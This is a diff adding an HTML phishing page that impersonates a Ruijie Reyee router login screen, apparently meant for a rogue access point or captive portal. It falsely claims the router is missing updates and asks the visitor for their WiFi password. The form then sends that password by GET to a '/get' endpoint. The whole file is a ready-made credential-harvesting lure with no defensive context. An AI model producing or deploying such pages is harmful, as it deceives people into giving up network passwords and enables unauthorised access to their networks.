@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ruijie Reyee Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #66c3a7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .login-container h1 {
+      color: #5c8f78;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .submit-btn {
+      background-color: #66c3a7;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .submit-btn:hover {
+      background-color: #4d7867;
+    }
+    .error-message {
+      color: red;
+      margin: 10px 0;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <!-- Logo Image with Base64 -->
+    <img src="data:image/png;base64,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" alt="Ruijie Logo" class="logo" width="150">
+
+<center>Your router is missing important updates, Please enter your WIFI password below to begin the update
+    <form action="/get" id="login-form" method="get">
+      
+      <input type="hidden" name="email" class="input-field" value="Ruijie" required>
+      
+      <input type="password" name="password" class="input-field" placeholder="Password" required>
+      
+      <div class="error-message"></div>
+      
+      <button class="submit-btn" type="submit">Log In</button>
+    </form>
+    <p class="footer">
+      Google Chrome, IE Explorer 9, 10 or 11, and 360 Browser are supported.
+    </p>
+  </div>
+
+</body>
+</html>
